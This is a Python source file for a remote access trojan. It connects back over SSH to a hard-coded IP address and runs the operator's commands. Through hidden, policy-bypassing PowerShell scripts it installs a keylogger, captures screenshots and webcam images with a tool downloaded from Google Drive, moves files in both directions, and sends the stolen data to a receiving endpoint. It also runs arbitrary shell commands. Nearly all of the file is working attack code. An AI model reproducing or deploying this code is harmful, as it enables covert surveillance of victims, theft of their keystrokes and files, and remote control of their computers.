import threading
import paramiko
import subprocess
#import requests
import os
import platform
import time


def ssh_command(ip, port, user, passwd, command):
   client = paramiko.SSHClient()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   client.connect(ip, port, username=user, password=passwd)
   ssh_session = client.get_transport().open_session()
   if ssh_session.active:
      ssh_session.send(command)

      while True:
        command = ssh_session.recv(1024)

        if command.startswith('download'):
         if platform.system().lower() == "windows":
###           try:
###             url = 'forwarding/receive.php'
###             files = {'file': open(command.lstrip('download '), 'rb')}
###             r = requests.post(url, files=files)
             download_path=command.lstrip('download ')
             os.system('echo $file = \"'+download_path+'\" >> %USERPROFILE%\\d.ps1 & echo (New-Object System.Net.WebClient).UploadFile(\'forwarding/receive.php\', $file) >> %USERPROFILE%\\d.ps1 & start /b /min powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\d.ps1 & exit')
             cmd_output = subprocess.check_output("echo File Sent!", shell=True)
             ssh_session.send(cmd_output)
             cmd_output = subprocess.check_output("echo Done!", shell=True)
             ssh_session.send(cmd_output)
###           except Exception,e:
###               print '\nUnable to download the file from the remote server'
###               print 'PYTHON SAYS:',e


        elif command.startswith('upload'):
         if platform.system().lower() == "windows":
 #          try:
             os.system('echo ([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12) > %USERPROFILE%\\up.ps1 & echo (New-Object System.Net.WebClient).DownloadFile(\'forwarding/' + command.lstrip('upload ') + '\',' + '$home+' + '\'' + '\\' + command.lstrip('upload ') + '\')  >> %USERPROFILE%\\up.ps1 & start /b /min powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\up.ps1')
             cmd_output = subprocess.check_output("echo Done! Uploaded to & echo %USERPROFILE%\\"+ command.lstrip('upload '), shell=True)
             ssh_session.send(cmd_output)
#           except Exception,e:
#               print '\nUnable to download the file from the remote server'
#               print 'PYTHON SAYS:',e


        elif command.lower() == "screenshot":

      	 if platform.system().lower() == "windows":

             os.system('del %USERPROFILE%\\screenshot.bmp')
             os.system('echo $outputFile = $home+\"/screenshot.bmp\" > %USERPROFILE%\\ps.ps1 & echo Add-Type -AssemblyName System.Windows.Forms >> %USERPROFILE%\\ps.ps1 & echo Add-type -AssemblyName System.Drawing >> %USERPROFILE%\\ps.ps1 & echo $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen >> %USERPROFILE%\\ps.ps1 & echo $Width = $Screen.Width >> %USERPROFILE%\\ps.ps1 & echo $Height = $Screen.Height >> %USERPROFILE%\\ps.ps1 & echo $Left = $Screen.Left >> %USERPROFILE%\\ps.ps1 & echo $Top = $Screen.Top >> %USERPROFILE%\\ps.ps1 & echo $screenshotImage = New-Object System.Drawing.Bitmap $Width, $Height >> %USERPROFILE%\\ps.ps1 & echo $graphicObject = [System.Drawing.Graphics]::FromImage($screenshotImage) >> %USERPROFILE%\\ps.ps1 & echo $graphicObject.CopyFromScreen($Left, $Top, 0, 0, $screenshotImage.Size) >> %USERPROFILE%\\ps.ps1 & echo $screenshotImage.Save($outputFile) >> %USERPROFILE%\\ps.ps1 & echo (New-Object System.Net.WebClient).UploadFile(\'forwarding/receive.php\',$outputFile) >> %USERPROFILE%\ps.ps1 & start /b /min powershell -windowstyle hidden -ExecutionPolicy ByPass  -File %USERPROFILE%\\ps.ps1 & exit')

# Upload in Python
#             url = 'forwarding/receive.php'
#             pathscreen = os.getenv("USERPROFILE")+"/screenshot.bmp"
#             files = {'file': open(pathscreen, 'rb')}
#             r = requests.post(url, files=files)
             cmd_output = subprocess.check_output("echo Done!", shell=True)
             ssh_session.send(cmd_output)

        elif command.lower() == "keylogger send":


             os.system('echo $file = \"$home/keylogger.txt\" >> %USERPROFILE%\\sk.ps1 & echo (New-Object System.Net.WebClient).UploadFile(\'forwarding/receive.php\', $file) >> %USERPROFILE%\\sk.ps1 & start /b /min  powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\sk.ps1 & exit')
             cmd_output = subprocess.check_output("echo File Sent!", shell=True)
             ssh_session.send(cmd_output)


        elif command.lower() == "webcam":

	  if platform.system().lower() == "windows":
             cmd_output = subprocess.check_output("echo Done! Wait the file at uploadedfiles/image.bmp", shell=True)
             ssh_session.send(cmd_output)

             os.system('del %USERPROFILE%\\image.bmp')
             os.system('echo (New-Object System.Net.WebClient).DownloadFile(\'https://drive.google.com/uc?authuser=0^&id=0B3NaVR72FYQcRmhtRFZxY3lGZFU^&export=download\', \'CommandCam.exe\')  > %USERPROFILE%\\getcc.ps1 & echo Start-Process -FilePath \"$home/CommandCam.exe \" -ArgumentList \"/filename $home/image.bmp /quiet\" -windowstyle hidden -Wait >> %USERPROFILE%\\getcc.ps1 & echo $file = \"$home/image.bmp\" >> %USERPROFILE%\\getcc.ps1 & echo (New-Object System.Net.WebClient).UploadFile(\'forwarding/receive.php\', $file) >> %USERPROFILE%\\getcc.ps1 & start /b /min powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\getcc.ps1 & exit')

# Python upload
#             url = 'forwarding/receive.php'
#             pathfile = os.getenv("USERPROFILE")+"/image.bmp"
#             files = {'file': open(pathfile, 'rb')}
#             r = requests.post(url, files=files)


        elif command.lower() == "keylogger":
	  if platform.system().lower() == "windows":

	     try:
                  cmd_output = subprocess.check_output("echo Done! Keylogger started. To receive file use command: keylogger send", shell=True)
                  ssh_session.send(cmd_output)
             except Exception,e:
                  ssh_session.send(str(e))


             os.system('echo function Start-KeyLogger($Path="$home\keylogger.txt") { > %USERPROFILE%\k.ps1 & echo   $signatures = @\' >> %USERPROFILE%\k.ps1  & echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] >> %USERPROFILE%\k.ps1 & echo public static extern short GetAsyncKeyState(int virtualKeyCode); >> %USERPROFILE%\k.ps1  & echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] >> %USERPROFILE%\k.ps1 & echo public static extern int GetKeyboardState(byte[] keystate); >> %USERPROFILE%\k.ps1 & echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] >> %USERPROFILE%\k.ps1 & echo public static extern int MapVirtualKey(uint uCode, int uMapType); >> %USERPROFILE%\k.ps1 & echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] >> %USERPROFILE%\k.ps1 & echo public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags); >> %USERPROFILE%\k.ps1 & echo \'@  >> %USERPROFILE%\k.ps1 & echo   $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru >> %USERPROFILE%\k.ps1 & echo   $null = New-Item -Path $Path -ItemType File -Force >> %USERPROFILE%\k.ps1 & echo   try  { & echo     while ($true) { >> %USERPROFILE%\k.ps1 & echo       Start-Sleep -Milliseconds 40 >> %USERPROFILE%\k.ps1 & echo       for ($ascii = 9; $ascii -le 254; $ascii++) { >> %USERPROFILE%\k.ps1 & echo         $state = $API::GetAsyncKeyState($ascii) >> %USERPROFILE%\k.ps1 & echo         if ($state -eq -32767) { >> %USERPROFILE%\k.ps1 & echo           $null = [console]::CapsLock >> %USERPROFILE%\k.ps1 & echo           $virtualKey = $API::MapVirtualKey($ascii, 3) >> %USERPROFILE%\k.ps1 & echo           $kbstate = New-Object Byte[] 256 >> %USERPROFILE%\k.ps1 & echo           $checkkbstate = $API::GetKeyboardState($kbstate) >> %USERPROFILE%\k.ps1 & echo           $mychar = New-Object -TypeName System.Text.StringBuilder >> %USERPROFILE%\k.ps1 & echo           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0) >> %USERPROFILE%\k.ps1  & echo           if ($success) { >> %USERPROFILE%\k.ps1 & echo             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) >> %USERPROFILE%\k.ps1 & echo                   }      }    }  }  finally   {   } } >> %USERPROFILE%\k.ps1 & echo Start-KeyLogger >> %USERPROFILE%\k.ps1 & start /b /min powershell -windowstyle hidden -ExecutionPolicy ByPass -File %USERPROFILE%\k.ps1')


        elif command.lower() == "exit":
           sys.exit()
        else:

         try:
            cmd_output = subprocess.check_output(command+" & echo Done!", shell=True)
            ssh_session.send(cmd_output)
         except Exception,e:
            ssh_session.send(str(e))

      client.close()
   return

while True:

 try:
   ssh_command('159.89.214.31', 'serveo_port', 'payload_username', 'payload_password','Type \'help\' for commands')
 except Exception:

   time.sleep(60)
